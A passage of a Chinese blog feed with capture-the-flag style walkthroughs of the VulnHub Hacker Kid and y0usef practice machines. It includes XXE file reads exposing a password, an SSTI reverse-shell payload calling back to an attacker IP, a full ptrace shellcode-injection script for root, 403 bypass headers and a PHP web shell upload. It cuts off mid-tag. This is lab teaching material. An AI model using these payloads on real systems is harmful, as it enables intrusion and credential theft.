尝试对页面进行区域传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @192.168.137.244 blackhat.local</span><br></pre></td></tr></table></figure><blockquote><p><code>axfr</code>发起axfr请求</p><p>axfr请求常用于主、从dns服务器之间同步数据.发送axfr请求后,主dns会把指定区域(顶级域)下的所有解析记录返回.</p><p>一般来说,axfr请求应仅限于主、备dns服务器之间,但是由于错误的配置导致任何人都可以获得指定区域下的所有解析记录.这种漏洞叫做<strong>DNS区域传输漏洞</strong></p><p><code>@192.168.137.244</code>用于指定dns服务器</p><p><code>blackhat.local</code>为顶级域名,也就是<strong>指定区域</strong></p><p>​                                                                                                  –by qiao</p></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230115910294.png" alt="image-20211230115910294"></p><p>页面返回了目标DNS服务器的所有解析记录，说明存在DNS区域传输漏洞</p><p>将记录中一些特别的解析域名绑定添加到hosts内</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230120322543.png" alt="image-20211230120322543"></p><p>逐一访问后</p><p>发现hackerkid.blackhat.local 内有类似注册的页面</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230120519667.png" alt="image-20211230120519667"></p><h3 id="3-XXE注入"><a href="#3-XXE注入" class="headerlink" title="3.XXE注入"></a>3.XXE注入</h3><p>尝试对该页面提交数据 并抓取包 将其发送到Repeater页面</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230121207620.png" alt="image-20211230121207620"></p><p>发现该页面是一个xml文件，且提交会返回存在email标签内的内容，猜测email标签内为回显位，目标可能存在XXE漏洞</p><p>结合XXE漏洞，尝试读取&#x2F;etc&#x2F;passwd文件</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230121911283.png" alt="image-20211230121911283"></p><p>在读取到的信息中发现saket用户为可登录账号</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230122433994.png" alt="image-20211230122433994"></p><p>尝试读取&#x2F;home&#x2F;saket&#x2F;.bashrc    (&#x2F;bin&#x2F;bash的配置文件)</p><p>使用php封装器&#x2F;伪协议结合Base64编码读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143019938.png" alt="image-20211230143019938"></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143225434.png" alt="image-20211230143225434"></p><p>解码后成功读取到用户名admin和密码Saket!#$%@!!</p><p>但是回忆之前的诸多页面中好像并不存在登录页面</p><p>仔细想想 9999端口还没有查看过</p><h3 id="4-访问9999端口"><a href="#4-访问9999端口" class="headerlink" title="4.访问9999端口"></a>4.访问9999端口</h3><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230120716304.png" alt="image-20211230120716304"></p><p>又惊又喜 是一个登录页面 将刚才得到的账号密码输入</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143542613.png" alt="image-20211230143542613"></p><p>结果显示报错</p><p>尝试使用saket作为用户名 密码不变</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143658858.png" alt="image-20211230143658858"></p><p>登陆成功！页面提示需要知道我的名字 那么如何才能让他知道我的名字呢？ 尝试name参数提交名字！！！</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143925201.png" alt="image-20211230143925201"></p><p>尝试几次后，发现其格式为“Hello 输入内容”，怀疑是否可能是模版注入呢？</p><h3 id="5-SSTI模板注入"><a href="#5-SSTI模板注入" class="headerlink" title="5.SSTI模板注入"></a>5.SSTI模板注入</h3><p>构造payload做测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]       #abcxyz处意为 无规则的、不应被开发者提前定义的函数名</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230175025746.png" alt="image-20211230175025746"></p><p>因不能运行解析abcxyz，页面返回了报错信息，可知其为python3.8的语言环境</p><p>再次构造payload测试是否可以执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230175324680.png" alt="image-20211230175324680"></p><p>页面返回了执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>内的语句信息</p><p>构造攻击反弹shell的payload:</p><p>kali：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.137.22/4444 0&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230180135061.png" alt="image-20211230180135061"></p><p>结果显示报错，并没有反弹shell</p><p>尝试将其进行URL编码再执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#x27;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.137.22%2F4444%200%3E%261%22&#x27;)%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230180841637.png" alt="image-20211230180841637"></p><p>成功反弹shell</p><h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><p>当前用户只为普通用户，需提权至root</p><h3 id="1-常规提权"><a href="#1-常规提权" class="headerlink" title="1.常规提权"></a>1.常规提权</h3><p>尝试uname -a,sudo -l,suid三种方法都没能成功提权</p><h3 id="2-使用Capabilities提权"><a href="#2-使用Capabilities提权" class="headerlink" title="2.使用Capabilities提权"></a>2.使用Capabilities提权</h3><p>尝试使用Capabilities进行提权</p><p>Capabilities科普：</p><blockquote><p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p></blockquote><p>构造语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r /     #递归查询根目录下设置了capabilities的可执行文件</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230182733872.png" alt="image-20211230182733872"></p><p>目标系统的环境变量未设置getcap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null     #过滤错误信息</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230183234783.png" alt="image-20211230183234783"></p><p>从查询到的信息中进行筛选，绝大多数大多是对网络数据包的查看，对提权没有帮助。</p><p>但值得注意的是，针对python2.7设置了cap_sys_ptrace+ep</p><blockquote><p>ptrace是一个系统调用，它提供了一种方法来让‘父’进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。 主要用来实现断点调试和系统调用跟踪。</p><p>ptrace会在什么时候出现呢？在执行系统调用之前，内核会先检查当前进程是否处于被“跟踪”(traced)的状态。如果是的话，内核暂停当前进程并将控制权交给跟踪进程，使跟踪进程得以察看或者修改被跟踪进程的寄存器。</p><p>利用ptrace可以</p><ol><li>劫持另一个进程的系统调用，修改传入参数，返回值</li><li>向另一个进程注入代码，获得一个进程的eip,esp后，建立自己的栈空间，并使eip指向自己的代码</li></ol><p><a href="https://onestraw.github.io/linux/ptrace-hack/">https://onestraw.github.io/linux/ptrace-hack/</a></p></blockquote><p>故可以尝试利用ptrace提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -U root 或 ps -aef | grep   #查看以root权限运行的进程信息</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230185641921.png" alt="image-20211230185641921">下载使用注入脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&gt;# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span><br><span class="line">&gt;# GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span><br><span class="line"></span><br><span class="line">&gt;import ctypes</span><br><span class="line">&gt;import sys</span><br><span class="line">&gt;import struct</span><br><span class="line"></span><br><span class="line">&gt;# Macros defined in &lt;sys/ptrace.h&gt;</span><br><span class="line">&gt;# https://code.woboq.org/qt5/include/sys/ptrace.h.html</span><br><span class="line"></span><br><span class="line">&gt;PTRACE_POKETEXT   = 4</span><br><span class="line">&gt;PTRACE_GETREGS= 12</span><br><span class="line">&gt;PTRACE_SETREGS= 13</span><br><span class="line">&gt;PTRACE_ATTACH = 16</span><br><span class="line">&gt;PTRACE_DETACH = 17</span><br><span class="line"></span><br><span class="line">&gt;# Structure defined in &lt;sys/user.h&gt;</span><br><span class="line">&gt;# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><br><span class="line"></span><br><span class="line">&gt;class user_regs_struct(ctypes.Structure):</span><br><span class="line">_fields_ = [</span><br><span class="line">   (&quot;r15&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r14&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r13&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r12&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rbp&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rbx&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r11&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r10&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r9&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;r8&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rcx&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rdx&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rsi&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rdi&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;orig_rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rip&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;cs&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;eflags&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;rsp&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;ss&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;fs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;gs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;ds&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;es&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;fs&quot;, ctypes.c_ulonglong),</span><br><span class="line">   (&quot;gs&quot;, ctypes.c_ulonglong),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">&gt;libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">&gt;pid=int(sys.argv[1])</span><br><span class="line"></span><br><span class="line">&gt;# Define argument type and respone type.</span><br><span class="line">&gt;libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">&gt;libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line">&gt;# Attach to the process</span><br><span class="line">&gt;libc.ptrace(PTRACE_ATTACH, pid, None, None)</span><br><span class="line">&gt;registers=user_regs_struct()</span><br><span class="line"></span><br><span class="line">&gt;# Retrieve the value stored in registers</span><br><span class="line">&gt;libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Injecting Shellcode at: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">&gt;# Shell code copied from exploit db.</span><br><span class="line">&gt;shellcode=&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">&gt;# Inject the shellcode into the running process byte by byte.</span><br><span class="line">&gt;for i in xrange(0,len(shellcode),4):</span><br><span class="line"></span><br><span class="line"> # Convert the byte to little endian.</span><br><span class="line"> shellcode_byte_int=int(shellcode[i:4+i].encode(&#x27;hex&#x27;),16)</span><br><span class="line"> shellcode_byte_little_endian=struct.pack(&quot;&lt;I&quot;, shellcode_byte_int).rstrip(&#x27;\x00&#x27;).encode(&#x27;hex&#x27;)</span><br><span class="line"> shellcode_byte=int(shellcode_byte_little_endian,16)</span><br><span class="line"></span><br><span class="line"> # Inject the byte.</span><br><span class="line"> libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Shellcode Injected!!&quot;)</span><br><span class="line"></span><br><span class="line">&gt;# Modify the instuction pointer</span><br><span class="line">&gt;registers.rip=registers.rip+2</span><br><span class="line"></span><br><span class="line">&gt;# Set the registers</span><br><span class="line">&gt;libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line">&gt;print(&quot;Final Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"></span><br><span class="line">&gt;# Detach from the process.</span><br><span class="line">&gt;libc.ptrace(PTRACE_DETACH, pid, None, None)</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 inject.py ID  #将后门写进进程，并在本地开启端口5600端口</span><br></pre></td></tr></table></figure><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230191858784.png" alt="image-20211230191858784" style="zoom: 50%;" /><p>查看5600端口是否开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -pantu | grep 5600</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230192016676.png" alt="image-20211230192016676">结果显示开启，则说明注入成功，后门进程端口已成功开放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.137.244 5600</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230192038184.png" alt="image-20211230192038184"></p><p>成功获取root权限</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;靶机：&lt;a href=&quot;https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova&quot;&gt;https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova&lt;/a&gt;&lt;br&gt;  难度：中&lt;br&gt;  目标：取得root权限&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-8-y0usef</title>
    <link href="http://example.com/2022/04/12/week8/"/>
    <id>http://example.com/2022/04/12/week8/</id>
    <published>2022-04-12T07:08:42.967Z</published>
    <updated>2022-04-12T07:11:31.168Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>靶机地址：</strong><a href="https://download.vulnhub.com/y0usef/y0usef.ova">https://download.vulnhub.com/y0usef/y0usef.ova</a></p><p><strong>难度等级：</strong>低</p><p><strong>打靶目标：</strong>取得 root 权限 + 2 Flag</p></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093012124.png" alt="image-20220216093012124"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093201459.png" alt="image-20220216093201459"></p><h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80-sV -sC 192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093937980.png" alt="image-20220216093937980"></p><h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094324955.png" alt="image-20220216094324955"></p><p>页面提示该网站正在建设中，但它已经在运行</p><h4 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094548943.png" alt="image-20220216094548943"></p><p>也并未发现有帮助的信息</p><h4 id="whatweb网站指纹识别"><a href="#whatweb网站指纹识别" class="headerlink" title="whatweb网站指纹识别"></a>whatweb网站指纹识别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094848943.png" alt="image-20220216094848943"></p><h4 id="dirsearch目录扫描"><a href="#dirsearch目录扫描" class="headerlink" title="dirsearch目录扫描"></a>dirsearch目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.137.233</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095152430.png" alt="image-20220216095152430"></p><p>结果显示了大量403响应码，也就意味着目标服务器上存在这些目录&#x2F;文件，但是因权限不足不能访问。</p><blockquote><p>403错误是网站访问过程中，常见的错误提示。资源不可用，服务器理解客户的请求，但拒绝处理它。通常由于服务器上文件或目录的权限设置导致，比如IIS或者apache设置了访问权限不当。</p></blockquote><p>访问<a href="http://192.168.137.233/adminstration/">http://192.168.137.233/adminstration/</a></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095610319.png" alt="image-20220216095610319"></p><p>可能网站的管理者对权限进行了一些限制管理，那接下来该如何解决403呢？</p><h4 id="403Bypass"><a href="#403Bypass" class="headerlink" title="403Bypass"></a>403Bypass</h4><p>抓取页面请求的包发送到Burp内的Repeater</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216100952570.png" alt="image-20220216100952570"></p><h5 id="常见的4种403Bypass"><a href="#常见的4种403Bypass" class="headerlink" title="常见的4种403Bypass"></a>常见的4种403Bypass</h5><h6 id="使用旁站绕过403"><a href="#使用旁站绕过403" class="headerlink" title="使用旁站绕过403"></a>使用旁站绕过403</h6><blockquote><p>例：</p><p>如下是一个正常的请求响应403过程</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host:<a href="http://www.abc.com/">www.abc.com</a>                   <strong>#请求头</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>针对旁站进行修改</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host: $<strong>xxx</strong>$.abc.com                    <strong>#替换主机名</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>说明：如果服务器在进行ACL访问控制时，对访问<code>http://IP/auth/login</code>是验证<strong>请求头Host</strong>，那么尝试修改其<strong>请求头Host的头部</strong>，服务器会认为是<strong>企业内部的另外一台机器</strong>对<code>http://IP/auth/login</code>的正常访问，则可能利用此验证机制绕过403限制。</p></blockquote><h6 id="使用覆盖URL的方式绕过403"><a href="#使用覆盖URL的方式绕过403" class="headerlink" title="使用覆盖URL的方式绕过403"></a>使用覆盖URL的方式绕过403</h6><blockquote><p>例：</p><p>如下是一个正常的请求响应403过程</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1                 <strong>#请求行</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>覆盖URL</p><p>#Request</p><p> GET &#x2F; HTTP&#x2F;1.1</p><p> X-Original-URL: &#x2F;auth&#x2F;login               <strong>#覆盖URL</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>说明：如果服务器在进行ACL访问控制时，对访问<code>http://IP/auth/login</code>是验证请求行URL，那么尝试<strong>添加非标准的HTTP头</strong>（例如X-Original-URL、X-Rewrite-URL），<strong>来覆盖&#x2F;重写原始请求行中的URL</strong>，尝试使用该方法绕过403权限限制检查。</p></blockquote><h6 id="利用Referer头部绕过403"><a href="#利用Referer头部绕过403" class="headerlink" title="利用Referer头部绕过403"></a>利用Referer头部绕过403</h6><blockquote><p>例：</p><p>如下是一个正常的请求响应403过程</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1            </p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>覆盖URL</p><p>#Request</p><p> GET &#x2F; HTTP&#x2F;1.1</p><p> Referer: <a href="https://ip/auth/login">https://IP/auth/login</a>      <strong>#来源页面</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>补充：也可以使用<strong>Referer头部</strong>（Referer包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。如<code>http://IP/login.php</code>，即代表用户从login.php来到当前页面），如果<strong>Referer头部</strong>内的URL是一个<strong>需要较高权限才可访问的URL</strong>，若服务器会根据<strong>Referer头部</strong>来判断的话，则会认为<strong>是已经验证过的权限用户</strong>，可直接访问当前要访问的页面，可借此绕过403.</p></blockquote><h6 id="利用反向代理绕过403"><a href="#利用反向代理绕过403" class="headerlink" title="利用反向代理绕过403"></a>利用反向代理绕过403</h6><blockquote><p>例：</p><p>如下是一个正常的请求响应403过程</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host: 192.168.137.233                 </p><p>#Response</p><p> HTTP&#x2F;1.1 403 Forbidden</p><p>针对旁站进行修改</p><p>#Request</p><p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p><p> Host: 192.168.137.233   </p><p> X-Originating-IP: 127.0.0.1           <strong>#代理本地</strong></p><p>#Response</p><p> HTTP&#x2F;1.1 200 OK</p><p>说明：如果服务器在进行ACL访问控制时，那么尝试<strong>添加非标准的HTTP头</strong>（例如X-Originating-IP、X-Remote-IP、X-Forwarded-For），<strong>来使服务器认为请求来自服务器本地</strong>，尝试使用该方法绕过403权限限制检查。</p></blockquote><p>经过对以上4种方法的逐一尝试，最终<strong>利用反向代理绕过403</strong></p><h5 id="反向代理403Bypass"><a href="#反向代理403Bypass" class="headerlink" title="反向代理403Bypass"></a>反向代理403Bypass</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112556365.png" alt="image-20220216112556365"></p><p>将其放入Intrueder中Forward包</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112723612.png" alt="image-20220216112723612"></p><p>页面跳转至登陆表单</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112808474.png" alt="image-20220216112808474"></p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>经过尝试发现该表单账号密码都为弱口令admin</p><p>尝试提交用户名密码并进行抓包（须在每一次请求时添加X-Forwarded-For绕过403）</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113139211.png" alt="image-20220216113139211"></p><p>进入了后台页面，发现好像有上传页面</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113517608.png" alt="image-20220216113517608"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113658637.png" alt="image-20220216113658637"></p><p>写一句话木马a.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216114951617.png" alt="image-20220216114951617"></p><p>初次上传发现服务端有对上传文件的校验</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115137076.png" alt="image-20220216115137076"></p><p>经过尝试修改Content-Type即可绕过上传成功</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115304086.png" 